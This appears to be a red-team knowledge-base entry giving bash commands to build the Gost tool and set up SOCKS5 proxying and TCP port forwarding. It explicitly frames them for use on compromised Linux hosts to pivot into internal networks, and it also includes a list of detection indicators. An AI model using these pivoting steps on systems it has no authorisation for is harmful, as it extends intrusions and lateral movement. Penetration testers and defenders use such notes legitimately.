---
type: code
language: bash
verified: true
tags:
  - build
  - proxy-setup
platforms:
  - Linux
validated: true
---

# Build-Gost-Binary-Script

## Code

```bash
git clone https://github.com/ginuerzh/gost
cd gost/cmd/gost
go build

# Socks5 Proxy
Server side: gost -L=socks5://:1080
Client side: gost -L=:8080 -F=socks5://server_ip:1080?notls=true

# Local Port Forward
gost -L=tcp://:2222/192.168.1.1:22 [-F=..]
```

## Description

This bash script snippet clones, builds, and provides example invocations for the Gost tool to set up network pivoting via SOCKS5 proxy or TCP forwarding. It is used on compromised Linux systems to enable lateral movement by creating tunnels to internal resources.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| server_ip | IP address of the compromised server host | 192.168.1.100 |
| 192.168.1.1 | Example internal target IP for forwarding | 10.0.0.50 |

## Usage

Execute the build steps sequentially on the compromised host to prepare Gost. Then run the server-side command in the background (e.g., via nohup). On the attacker side, use the client command to proxy traffic. For port forwarding, adapt the local forward example to chain through the proxy if needed. This is typically part of a lateral movement procedure after initial access.

## Detection

- Monitor for 'git clone' processes targeting github.com/ginuerzh/gost or Go compilation events.
- Look for network listeners on ports like 1080 or 8080 without corresponding services.
- Detect unusual outbound connections from internal hosts to attacker IPs on proxy ports.
- Process monitoring for 'gost' binary execution or unknown tunnels.

## Related

- [[procedures/Network-Pivoting-with-Gost]]
- [[tools/Gost]]
